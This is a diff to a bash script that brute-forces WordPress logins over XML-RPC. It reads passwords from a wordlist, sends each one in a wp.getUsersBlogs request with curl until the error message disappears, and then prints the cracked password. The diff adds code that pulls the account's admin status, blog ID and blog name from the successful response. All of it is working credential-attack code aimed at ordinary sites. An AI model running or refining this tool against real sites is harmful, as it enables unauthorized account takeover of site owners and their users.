@@ -42,10 +42,15 @@ xmlrpcBruteForce () {
   echo -e "${purpleColour}[*]${endColour} ${grayColour}Running the attack...${endColour}"
   sleep 0.3
 
-  while IFS= read -r password; do
+  while read -r password; do
     response=$(curl -s -X POST $target -d "<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$username</value></param><param><value>$password</value></param></params></methodCall>")
     if [[ ! $(grep "Incorrect username or password." <<< $response) ]]; then
-      echo -e "${purpleColour}[*]${endColour}${grayColour} The password for${endColour}${blueColour} $username${endColour} ${grayColour}is${endColour} ${redColour}$password${endColour}"
+      echo -e "\n\n${purpleColour}[*]${endColour}${grayColour} The password for${endColour}${blueColour} $username${endColour} ${grayColour}is${endColour} ${redColour}$password${endColour}"
+      xmlData=$( xmlstarlet sel -t -v "//member[name='isAdmin']/value/boolean" -o " " -v "//member[name='blogid']/value/string" -o " " -v "//member[name='blogName']/value/string" -n <<< $response)
+      echo -e "${yellowColour}[*]${endColour} ${grayColour}Admin User:${endColour} ${turquoiseColour}$(cut -d " "  -f 1 <<< $xmlData)${endColour}"
+      echo -e "${yellowColour}[*]${endColour} ${grayColour}Blog ID:${endColour} ${turquoiseColour}$(cut -d " " -f 2 <<< $xmlData)${endColour}"
+      echo -e "${yellowColour}[*]${endColour} ${grayColour}Blog Name:${endColour} ${turquoiseColour}$(cut -d " " -f 3- <<< $xmlData)${endColour}"
+
       break; exit 0
     fi
   done < $wordlistPath
@@ -65,6 +70,9 @@ done
 
 if [[ -r $wordlistPath ]] && [[ $username ]] && [[ $target ]]; then
   xmlrpcBruteForce
+
+else
+  exitFunc "Some parameter is incorrect"
 fi
 
 
